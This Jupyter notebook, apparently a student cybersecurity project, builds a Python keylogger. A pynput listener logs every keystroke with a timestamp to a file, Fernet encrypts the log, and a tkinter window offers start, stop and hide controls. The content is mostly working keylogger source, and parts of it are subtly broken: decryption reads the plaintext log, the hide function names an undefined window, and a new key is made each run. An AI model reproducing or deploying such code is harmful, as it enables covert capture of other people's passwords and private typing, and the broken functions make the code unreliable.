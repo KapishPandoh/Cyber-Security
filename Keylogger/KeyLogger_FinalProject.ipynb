{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4dbd6cfa",
   "metadata": {},
   "source": [
    "**Project Overview**:\n",
    "- The project aims to create a keylogger program that captures keystrokes on a computer.\n",
    "\n",
    "- The program should run in the background and record all the keystrokes made by the user.\n",
    "\n",
    "- The captured keystrokes will be stored in a log file for later analysis."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "92e77dd6",
   "metadata": {},
   "source": [
    "## Import Libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a89a33ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "#used listener to monitor keyboard events\n",
    "# to access keystroke from the keyboard\n",
    "\n",
    "#!python -m pip install pynput\n",
    "from pynput.keyboard import Listener\n",
    "\n",
    "import threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "be9da7bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "# to store keystrokes in the json file\n",
    "import json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "dd57563c",
   "metadata": {},
   "outputs": [],
   "source": [
    "#creating gui interface\n",
    "import tkinter as tk\n",
    "from tkinter import *"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40527444",
   "metadata": {},
   "source": [
    "**Fernet**:\n",
    "- Cryptography deals with the encryption of plaintext into ciphertext and decryption of ciphertext into plaintext.\n",
    "\n",
    "- Python supports a cryptography package that helps us encrypt and decrypt data. \n",
    "\n",
    "- The fernet module of the cryptography package has inbuilt functions for the generation of the key, encryption of plaintext \n",
    "  into ciphertext, and decryption of ciphertext into plaintext using the encrypt and decrypt methods respectively.\n",
    "\n",
    "- The fernet module guarantees that data encrypted using it cannot be further manipulated or read without the key. \n",
    "\n",
    "\n",
    "**Methods Used**:\n",
    "\n",
    " * generate_key() : \n",
    "     - This method generates a new fernet key. \n",
    "     - The key must be kept safe as it is the most important component to decrypt the ciphertext. \n",
    "     - If the key is lost then the user can no longer decrypt the message. \n",
    "     - Also if an intruder or hacker gets access to the key they can not only read the data but also forge the data.\n",
    "     \n",
    " * encrypt(data)  : \n",
    "    - It encrypts data passed as a parameter to the method. \n",
    "    - The outcome of this encryption is known as a “Fernet token” which is basically the ciphertext. \n",
    "    - The encrypted token also contains the current timestamp when it was generated in plaintext. \n",
    "    - The encrypt method throws an exception if the data is not in bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "1788d7cf",
   "metadata": {},
   "outputs": [],
   "source": [
    "# !pip install cryptography\n",
    "# !pip install paramiko\n",
    "\n",
    "from cryptography.fernet import Fernet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "877dbe2d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import datetime"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "e0740075",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "1d730191",
   "metadata": {},
   "outputs": [],
   "source": [
    "import warnings\n",
    "warnings.filterwarnings(\"ignore\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9aca501f",
   "metadata": {},
   "source": [
    "## Global Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6c1a8967",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Encryption key\n",
    "# key is generated\n",
    "key = Fernet.generate_key()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "7f3b5637",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Log file path\n",
    "log_file = \"keystrokes.log\"\n",
    "\n",
    "# encrypt file\n",
    "log_file_encrypted = \"EncryptedFile_keystrokes.log\"\n",
    "\n",
    "# decrypt file\n",
    "log_file_decrypted = \"DecryptedFile_keystrokes.log\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "17189ffb",
   "metadata": {},
   "outputs": [],
   "source": [
    "# to keep track of the keylogger's running status\n",
    "# It is set to False initially and is toggled between True and False when starting or stopping the keylogger, respectively.\n",
    "running  = False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "783400ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "listener = None"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9464c592",
   "metadata": {},
   "source": [
    "## Functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "2d1da367",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    with open(log_file, \"a\") as f:\n",
    "        f.write(\"{0}: {1}\\n\".format(datetime.datetime.now(), key))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a67f13de",
   "metadata": {},
   "source": [
    "`In the start_keylogger() function, the keylogger is started only if running is False. Similarly, in the stop_keylogger() function, the keylogger is stopped only if running is True.\n",
    "`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "8c2369ff",
   "metadata": {},
   "outputs": [],
   "source": [
    "def start_keylogger():\n",
    "    global running ,listener\n",
    "    \n",
    "    if not running:\n",
    "        running = True\n",
    "        listener = Listener(on_press=on_press)\n",
    "        listener.start()\n",
    "        \n",
    "#         with Listener(on_press=on_press) as listener:\n",
    "#             listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "71f0cd5e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def stop_keylogger():\n",
    "    global running ,listener\n",
    "    \n",
    "    if running and listener is not None:\n",
    "        running = False\n",
    "        listener.stop()\n",
    "        listener.join()\n",
    "        \n",
    "    # Close any open files\n",
    "    with open(log_file, \"a\") as f:\n",
    "        f.close()\n",
    "    \n",
    "    # Perform final encryption of the log file\n",
    "    encrypt_file()\n",
    "    \n",
    "    exit(0)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6486805a",
   "metadata": {},
   "source": [
    "`Encryption and Decryption: The encrypt_file() and decrypt_file() functions use the cryptography library to encrypt and decrypt the log file using the provided encryption key.\n",
    "`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "24abc250",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Encrypt the log file\n",
    "def encrypt_file():\n",
    "    \n",
    "    with open(log_file, 'rb') as f:\n",
    "        data = f.read()\n",
    "    \n",
    "    # value of key is assigned to a variable\n",
    "    fernet = Fernet(key)\n",
    "    \n",
    "    # the plaintext is converted to ciphertext\n",
    "    encrypted_data = fernet.encrypt(data)\n",
    "    \n",
    "    with open(log_file_encrypted, 'wb') as f:\n",
    "        f.write(encrypted_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "01af2d1a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Decrypt the log file\n",
    "def decrypt_file():\n",
    "    \n",
    "    with open(log_file, 'rb') as f:\n",
    "        encrypted_data = f.read()\n",
    "        \n",
    "    # value of key is assigned to a variable\n",
    "    fernet = Fernet(key)\n",
    "    \n",
    "    # decrypting the ciphertext\n",
    "    decrypted_data = fernet.decrypt(encrypted_data)\n",
    "    \n",
    "    with open(log_file_decrypted, 'wb') as f:\n",
    "        f.write(decrypted_data)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "92967ca4",
   "metadata": {},
   "source": [
    "`Hide Window: The hide_window() function utilizes the iconify() method to hide the program window when the \"Hide\" button is clicked.`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "bd223908",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Hide the program window\n",
    "def hide_window():\n",
    "    window.iconify()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9e89e725",
   "metadata": {},
   "source": [
    "## Graphical User Interfaces (GUI)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "77ebcf44",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#create a window name \"root\"\n",
    "root = tk.Tk()\n",
    "\n",
    "#size of root window\n",
    "root.geometry(\"300x150\")\n",
    "\n",
    "#title of root window\n",
    "root.title(\"KeyLogger\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "255879ac",
   "metadata": {},
   "outputs": [],
   "source": [
    "start_button = tk.Button(root ,text=\"Start\" ,command=start_keylogger)\n",
    "stop_button  = tk.Button(root ,text=\"Stop\"  ,command=stop_keylogger)\n",
    "\n",
    "encrypt_button = tk.Button(root ,text=\"Encrypt Log\" ,command=encrypt_file)\n",
    "decrypt_button = tk.Button(root ,text=\"Decrypt Log\" ,command=decrypt_file)\n",
    "\n",
    "hide_button = tk.Button(root ,text=\"Hide\" ,command=hide_window)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "d6c714bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "start_button.pack(pady=5)\n",
    "stop_button.pack(pady=5)\n",
    "\n",
    "encrypt_button.pack(pady=5)\n",
    "decrypt_button.pack(pady=5)\n",
    "\n",
    "hide_button.pack(pady=5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "95487756",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Hide the program window on startup\n",
    "root.mainloop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ee61fd3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
